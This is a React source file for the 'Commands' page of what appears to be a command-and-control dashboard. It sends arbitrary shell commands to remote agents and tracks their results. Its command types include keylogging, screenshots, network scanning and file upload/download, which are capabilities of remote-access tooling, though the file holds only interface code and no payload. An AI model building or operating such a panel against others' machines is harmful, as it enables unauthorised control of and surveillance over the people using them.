import React, { useState, useEffect } from 'react';
import { 
  Plus, 
  Search, 
  Filter, 
  Terminal, 
  Clock,
  CheckCircle,
  XCircle,
  AlertCircle,
  Play,
  Square,
  RotateCcw,
  Trash2,
  Eye
} from 'lucide-react';
import api from '../services/api';
import toast from 'react-hot-toast';

const Commands = () => {
  const [commands, setCommands] = useState([]);
  const [agents, setAgents] = useState([]);
  const [loading, setLoading] = useState(true);
  const [searchTerm, setSearchTerm] = useState('');
  const [statusFilter, setStatusFilter] = useState('');
  const [agentFilter, setAgentFilter] = useState('');
  const [showCreateModal, setShowCreateModal] = useState(false);
  const [selectedCommand, setSelectedCommand] = useState(null);
  const [showDetailsModal, setShowDetailsModal] = useState(false);
  const [showDeleteModal, setShowDeleteModal] = useState(false);

  useEffect(() => {
    loadCommands();
    loadAgents();
  }, [searchTerm, statusFilter, agentFilter]);

  const loadCommands = async () => {
    try {
      setLoading(true);
      const params = {};
      if (searchTerm) params.search = searchTerm;
      if (statusFilter) params.status = statusFilter;
      if (agentFilter) params.agentId = agentFilter;
      
      const response = await api.getCommands(params);
      setCommands(response.commands);
    } catch (error) {
      toast.error('Failed to load commands');
      console.error('Commands error:', error);
    } finally {
      setLoading(false);
    }
  };

  const loadAgents = async () => {
    try {
      const response = await api.getAgents();
      setAgents(response.agents);
    } catch (error) {
      console.error('Agents error:', error);
    }
  };

  const handleCreateCommand = async (commandData) => {
    try {
      await api.createCommand(commandData);
      toast.success('Command created and sent to agent');
      setShowCreateModal(false);
      loadCommands();
    } catch (error) {
      toast.error(error.error || 'Failed to create command');
    }
  };

  const handleCancelCommand = async (commandId) => {
    try {
      await api.cancelCommand(commandId);
      toast.success('Command cancelled');
      loadCommands();
    } catch (error) {
      toast.error(error.error || 'Failed to cancel command');
    }
  };

  const handleRetryCommand = async (commandId) => {
    try {
      await api.retryCommand(commandId);
      toast.success('Command retried');
      loadCommands();
    } catch (error) {
      toast.error(error.error || 'Failed to retry command');
    }
  };

  const handleDeleteCommand = async () => {
    try {
      await api.deleteCommand(selectedCommand._id);
      toast.success('Command deleted successfully');
      setShowDeleteModal(false);
      setSelectedCommand(null);
      loadCommands();
    } catch (error) {
      toast.error(error.error || 'Failed to delete command');
    }
  };

  const getStatusColor = (status) => {
    switch (status) {
      case 'pending': return 'bg-yellow-100 text-yellow-800';
      case 'executing': return 'bg-blue-100 text-blue-800';
      case 'completed': return 'bg-green-100 text-green-800';
      case 'failed': return 'bg-red-100 text-red-800';
      case 'cancelled': return 'bg-gray-100 text-gray-800';
      case 'timeout': return 'bg-orange-100 text-orange-800';
      default: return 'bg-gray-100 text-gray-800';
    }
  };

  const getStatusIcon = (status) => {
    switch (status) {
      case 'pending': return <Clock className="h-4 w-4" />;
      case 'executing': return <Play className="h-4 w-4" />;
      case 'completed': return <CheckCircle className="h-4 w-4" />;
      case 'failed': return <XCircle className="h-4 w-4" />;
      case 'cancelled': return <Square className="h-4 w-4" />;
      case 'timeout': return <AlertCircle className="h-4 w-4" />;
      default: return <Terminal className="h-4 w-4" />;
    }
  };

  const canCancel = (status) => {
    return ['pending', 'executing'].includes(status);
  };

  const canRetry = (status) => {
    return ['failed', 'timeout'].includes(status);
  };

  if (loading) {
    return (
      <div className="flex items-center justify-center h-64">
        <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-primary-500"></div>
      </div>
    );
  }

  return (
    <div className="space-y-6">
      {/* Header */}
      <div className="flex items-center justify-between">
        <div>
          <h1 className="text-2xl font-bold text-white">Commands</h1>
          <p className="text-dark-400">Execute and manage commands on agents</p>
        </div>
        <button
          onClick={() => setShowCreateModal(true)}
          className="btn btn-primary flex items-center"
        >
          <Plus className="h-4 w-4 mr-2" />
          New Command
        </button>
      </div>

      {/* Filters */}
      <div className="card">
        <div className="flex flex-col sm:flex-row gap-4">
          <div className="flex-1">
            <div className="relative">
              <Search className="absolute left-3 top-1/2 transform -translate-y-1/2 h-4 w-4 text-dark-400" />
              <input
                type="text"
                placeholder="Search commands..."
                value={searchTerm}
                onChange={(e) => setSearchTerm(e.target.value)}
                className="input pl-10"
              />
            </div>
          </div>
          <div className="sm:w-48">
            <select
              value={statusFilter}
              onChange={(e) => setStatusFilter(e.target.value)}
              className="input"
            >
              <option value="">All Status</option>
              <option value="pending">Pending</option>
              <option value="executing">Executing</option>
              <option value="completed">Completed</option>
              <option value="failed">Failed</option>
              <option value="cancelled">Cancelled</option>
              <option value="timeout">Timeout</option>
            </select>
          </div>
          <div className="sm:w-48">
            <select
              value={agentFilter}
              onChange={(e) => setAgentFilter(e.target.value)}
              className="input"
            >
              <option value="">All Agents</option>
              {agents.map(agent => (
                <option key={agent._id} value={agent._id}>
                  {agent.name}
                </option>
              ))}
            </select>
          </div>
        </div>
      </div>

      {/* Commands Table */}
      <div className="card p-0">
        <div className="overflow-x-auto">
          <table className="table">
            <thead>
              <tr>
                <th>Command</th>
                <th>Agent</th>
                <th>Type</th>
                <th>Status</th>
                <th>Priority</th>
                <th>Created</th>
                <th>Actions</th>
              </tr>
            </thead>
            <tbody>
              {commands.map((command) => (
                <tr key={command._id}>
                  <td>
                    <div className="flex items-center">
                      <Terminal className="h-5 w-5 text-primary-400 mr-3" />
                      <div className="max-w-xs">
                        <div className="font-medium text-white truncate">
                          {command.command.substring(0, 50)}
                          {command.command.length > 50 && '...'}
                        </div>
                        <div className="text-sm text-dark-400">
                          ID: {command.commandId}
                        </div>
                      </div>
                    </div>
                  </td>
                  <td>
                    <div className="text-sm text-white">
                      {command.agentId?.name || 'Unknown Agent'}
                    </div>
                    <div className="text-xs text-dark-400">
                      {command.agentId?.agentId || 'N/A'}
                    </div>
                  </td>
                  <td>
                    <span className="text-sm text-dark-300 capitalize">
                      {command.type.replace('_', ' ')}
                    </span>
                  </td>
                  <td>
                    <div className="flex items-center">
                      <span className={`inline-flex items-center px-2.5 py-0.5 rounded-full text-xs font-medium ${getStatusColor(command.status)}`}>
                        {getStatusIcon(command.status)}
                        <span className="ml-1">{command.status}</span>
                      </span>
                    </div>
                  </td>
                  <td>
                    <span className={`text-xs px-2 py-1 rounded ${
                      command.priority === 'critical' ? 'bg-red-100 text-red-800' :
                      command.priority === 'high' ? 'bg-orange-100 text-orange-800' :
                      command.priority === 'normal' ? 'bg-blue-100 text-blue-800' :
                      'bg-gray-100 text-gray-800'
                    }`}>
                      {command.priority}
                    </span>
                  </td>
                  <td>
                    <div className="text-sm text-dark-300">
                      {new Date(command.createdAt).toLocaleString()}
                    </div>
                  </td>
                  <td>
                    <div className="flex items-center space-x-2">
                      <button
                        onClick={() => {
                          setSelectedCommand(command);
                          setShowDetailsModal(true);
                        }}
                        className="text-dark-400 hover:text-white"
                        title="View Details"
                      >
                        <Eye className="h-4 w-4" />
                      </button>
                      
                      {canCancel(command.status) && (
                        <button
                          onClick={() => handleCancelCommand(command._id)}
                          className="text-red-400 hover:text-red-300"
                          title="Cancel Command"
                        >
                          <Square className="h-4 w-4" />
                        </button>
                      )}
                      
                      {canRetry(command.status) && (
                        <button
                          onClick={() => handleRetryCommand(command._id)}
                          className="text-blue-400 hover:text-blue-300"
                          title="Retry Command"
                        >
                          <RotateCcw className="h-4 w-4" />
                        </button>
                      )}
                      
                      <button
                        onClick={() => {
                          setSelectedCommand(command);
                          setShowDeleteModal(true);
                        }}
                        className="text-red-400 hover:text-red-300"
                        title="Delete Command"
                      >
                        <Trash2 className="h-4 w-4" />
                      </button>
                    </div>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </div>

      {commands.length === 0 && (
        <div className="text-center py-12">
          <Terminal className="h-12 w-12 text-dark-400 mx-auto mb-4" />
          <h3 className="text-lg font-medium text-white mb-2">No commands found</h3>
          <p className="text-dark-400 mb-4">Execute your first command on an agent.</p>
          <button
            onClick={() => setShowCreateModal(true)}
            className="btn btn-primary"
          >
            Create Command
          </button>
        </div>
      )}

      {/* Create Command Modal */}
      {showCreateModal && (
        <CreateCommandModal
          onClose={() => setShowCreateModal(false)}
          onSubmit={handleCreateCommand}
          agents={agents}
        />
      )}

      {/* Command Details Modal */}
      {showDetailsModal && selectedCommand && (
        <CommandDetailsModal
          command={selectedCommand}
          onClose={() => setShowDetailsModal(false)}
        />
      )}

      {/* Delete Confirmation Modal */}
      {showDeleteModal && selectedCommand && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
          <div className="bg-dark-800 rounded-lg p-6 max-w-md w-full mx-4">
            <h3 className="text-lg font-medium text-white mb-4">Delete Command</h3>
            <p className="text-dark-300 mb-6">
              Are you sure you want to delete this command? This action cannot be undone.
            </p>
            <div className="flex justify-end space-x-3">
              <button
                onClick={() => setShowDeleteModal(false)}
                className="btn btn-secondary"
              >
                Cancel
              </button>
              <button
                onClick={handleDeleteCommand}
                className="btn btn-danger"
              >
                Delete
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};

// Create Command Modal Component
const CreateCommandModal = ({ onClose, onSubmit, agents }) => {
  const [formData, setFormData] = useState({
    agentId: '',
    type: 'execute_command',
    command: '',
    parameters: {},
    priority: 'normal',
    timeout: 300000
  });

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData(prev => ({
      ...prev,
      [name]: value
    }));
  };

  const handleSubmit = (e) => {
    e.preventDefault();
    onSubmit(formData);
  };

  const commandTypes = [
    { value: 'execute_command', label: 'Execute Command' },
    { value: 'system_info', label: 'System Information' },
    { value: 'file_transfer', label: 'File Transfer' },
    { value: 'screenshot', label: 'Screenshot' },
    { value: 'keylog', label: 'Keylogger' },
    { value: 'network_scan', label: 'Network Scan' },
    { value: 'process_list', label: 'Process List' },
    { value: 'download_file', label: 'Download File' },
    { value: 'upload_file', label: 'Upload File' },
    { value: 'custom', label: 'Custom' }
  ];

  return (
    <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
      <div className="bg-dark-800 rounded-lg p-6 max-w-md w-full mx-4">
        <h3 className="text-lg font-medium text-white mb-4">Create New Command</h3>
        <form onSubmit={handleSubmit} className="space-y-4">
          <div>
            <label className="block text-sm font-medium text-dark-300 mb-1">
              Agent
            </label>
            <select
              name="agentId"
              value={formData.agentId}
              onChange={handleChange}
              required
              className="input"
            >
              <option value="">Select an agent</option>
              {agents.filter(agent => agent.status === 'online').map(agent => (
                <option key={agent._id} value={agent._id}>
                  {agent.name} ({agent.agentId})
                </option>
              ))}
            </select>
          </div>

          <div>
            <label className="block text-sm font-medium text-dark-300 mb-1">
              Command Type
            </label>
            <select
              name="type"
              value={formData.type}
              onChange={handleChange}
              required
              className="input"
            >
              {commandTypes.map(type => (
                <option key={type.value} value={type.value}>
                  {type.label}
                </option>
              ))}
            </select>
          </div>

          <div>
            <label className="block text-sm font-medium text-dark-300 mb-1">
              Command
            </label>
            <textarea
              name="command"
              value={formData.command}
              onChange={handleChange}
              required
              className="input"
              rows="4"
              placeholder="Enter the command to execute..."
            />
          </div>

          <div className="grid grid-cols-2 gap-4">
            <div>
              <label className="block text-sm font-medium text-dark-300 mb-1">
                Priority
              </label>
              <select
                name="priority"
                value={formData.priority}
                onChange={handleChange}
                className="input"
              >
                <option value="low">Low</option>
                <option value="normal">Normal</option>
                <option value="high">High</option>
                <option value="critical">Critical</option>
              </select>
            </div>
            <div>
              <label className="block text-sm font-medium text-dark-300 mb-1">
                Timeout (ms)
              </label>
              <input
                type="number"
                name="timeout"
                value={formData.timeout}
                onChange={handleChange}
                min="1000"
                max="3600000"
                className="input"
              />
            </div>
          </div>

          <div className="flex justify-end space-x-3 pt-4">
            <button
              type="button"
              onClick={onClose}
              className="btn btn-secondary"
            >
              Cancel
            </button>
            <button
              type="submit"
              className="btn btn-primary"
            >
              Execute Command
            </button>
          </div>
        </form>
      </div>
    </div>
  );
};

// Command Details Modal Component
const CommandDetailsModal = ({ command, onClose }) => {
  return (
    <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
      <div className="bg-dark-800 rounded-lg p-6 max-w-2xl w-full mx-4 max-h-[80vh] overflow-y-auto">
        <h3 className="text-lg font-medium text-white mb-4">Command Details</h3>
        
        <div className="space-y-4">
          <div className="grid grid-cols-2 gap-4">
            <div>
              <label className="block text-sm font-medium text-dark-300 mb-1">Command ID</label>
              <p className="text-sm text-white font-mono">{command.commandId}</p>
            </div>
            <div>
              <label className="block text-sm font-medium text-dark-300 mb-1">Type</label>
              <p className="text-sm text-white capitalize">{command.type.replace('_', ' ')}</p>
            </div>
          </div>

          <div>
            <label className="block text-sm font-medium text-dark-300 mb-1">Command</label>
            <pre className="bg-dark-700 p-3 rounded text-sm text-white overflow-x-auto">
              {command.command}
            </pre>
          </div>

          <div className="grid grid-cols-2 gap-4">
            <div>
              <label className="block text-sm font-medium text-dark-300 mb-1">Status</label>
              <span className={`inline-flex items-center px-2.5 py-0.5 rounded-full text-xs font-medium ${
                command.status === 'completed' ? 'bg-green-100 text-green-800' :
                command.status === 'failed' ? 'bg-red-100 text-red-800' :
                command.status === 'pending' ? 'bg-yellow-100 text-yellow-800' :
                'bg-gray-100 text-gray-800'
              }`}>
                {command.status}
              </span>
            </div>
            <div>
              <label className="block text-sm font-medium text-dark-300 mb-1">Priority</label>
              <p className="text-sm text-white capitalize">{command.priority}</p>
            </div>
          </div>

          <div>
            <label className="block text-sm font-medium text-dark-300 mb-1">Agent</label>
            <p className="text-sm text-white">{command.agentId?.name || 'Unknown Agent'}</p>
          </div>

          {command.result && (
            <div>
              <label className="block text-sm font-medium text-dark-300 mb-1">Result</label>
              <div className="bg-dark-700 p-3 rounded">
                <div className="mb-2">
                  <span className="text-sm font-medium text-white">Success: </span>
                  <span className={`text-sm ${command.result.success ? 'text-green-400' : 'text-red-400'}`}>
                    {command.result.success ? 'Yes' : 'No'}
                  </span>
                </div>
                {command.result.output && (
                  <div className="mb-2">
                    <label className="block text-xs font-medium text-dark-300 mb-1">Output:</label>
                    <pre className="text-xs text-white overflow-x-auto">
                      {command.result.output}
                    </pre>
                  </div>
                )}
                {command.result.error && (
                  <div className="mb-2">
                    <label className="block text-xs font-medium text-dark-300 mb-1">Error:</label>
                    <pre className="text-xs text-red-400 overflow-x-auto">
                      {command.result.error}
                    </pre>
                  </div>
                )}
                {command.result.executionTime && (
                  <div>
                    <span className="text-xs font-medium text-dark-300">Execution Time: </span>
                    <span className="text-xs text-white">{command.result.executionTime}ms</span>
                  </div>
                )}
              </div>
            </div>
          )}

          <div className="grid grid-cols-2 gap-4">
            <div>
              <label className="block text-sm font-medium text-dark-300 mb-1">Created</label>
              <p className="text-sm text-white">{new Date(command.createdAt).toLocaleString()}</p>
            </div>
            <div>
              <label className="block text-sm font-medium text-dark-300 mb-1">Executed</label>
              <p className="text-sm text-white">
                {command.executedAt ? new Date(command.executedAt).toLocaleString() : 'Not executed'}
              </p>
            </div>
          </div>
        </div>

        <div className="flex justify-end pt-4">
          <button
            onClick={onClose}
            className="btn btn-secondary"
          >
            Close
          </button>
        </div>
      </div>
    </div>
  );
};

export default Commands;